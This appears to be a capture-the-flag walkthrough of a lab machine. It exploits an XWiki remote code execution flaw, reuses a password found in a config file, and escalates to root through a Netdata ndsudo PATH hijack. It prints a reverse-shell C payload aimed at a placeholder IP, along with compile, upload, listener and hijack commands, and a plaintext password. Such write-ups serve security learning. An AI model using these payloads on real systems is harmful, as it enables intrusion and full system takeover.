**The first thing I did was an nmap scan**  
![[Pasted image 20250817150407.png]]  
we have port 8080, and it is vulnerable to an exploit

# CVE-2025–24893

## remote code execution (RCE)

Next, we use this exploit and we are able to obtain a reverse shell  
![[Pasted image 20250817151443.png]]

Now we are the user `xwiki` and we need to gain privilege escalation to another user.  
In the path we found a single user directory named `Oliver`, so we determined that this is the next target `/home`.

After looking around the xwiki files, we found a password in  
`/etc/xwiki/hibernate.cfg.xml`

![[Pasted image 20250817152623.png]]

`theEd1t0rTeam99`

Thanks to this, we have access to `oliver` and we can obtain the user flag  
![[Pasted image 20250817153438.png]]

---

# Privilege Escalation

Running checks showed that Oliver does not have permission to run any command as root — no binaries with elevated privileges like sometimes happens on other machines.  
`sudo -l`

![[Pasted image 20250817153841.png]]

Since I now had SSH access, I checked internal services using port forwarding

![[Pasted image 20250817154035.png]]

After checking local ports, I saw that port `127.0.0.1:19999` is used by Netdata, so I created an SSH tunnel: `19999`

---

**At the moment I opened the Netdata web page, a big warning appeared saying that the version is outdated — a great hint that it might be vulnerable**

# CVE-2024–32019

This vulnerability allows local privilege escalation (LPE)

We can create a fake binary that is executed instead of the real one when it tries to call `.nvme`, `ndsudo`, `nvme-list`.  
**Here is a simple malicious C program that does this:**

`#include <unistd.h>  #include <stddef.h>   int main() {       setuid(0);       setgid(0);       execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1", NULL);       return 0;   }`

We compile it statically to avoid issues

`x86_64-linux-gnu-gcc -o nvme exploit.c -static`

Next, upload it to the victim machine, make sure it is executable, and set the variable so that our fake binary is found first

`scp nvme oliver@10.10.11.80:/home/oliver/`

**Set up a listener**

`nc -lvnp port`

`chmod +x nvme PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`

![[Zrzut ekranu 2025-08-17 163515.png]]

**After execution, our reverse shell is launched and we get root via `ndsudo`**  
And **then just `cat /root/root.txt`** and that’s it!

---

![[Pasted image 20250817163802.png]]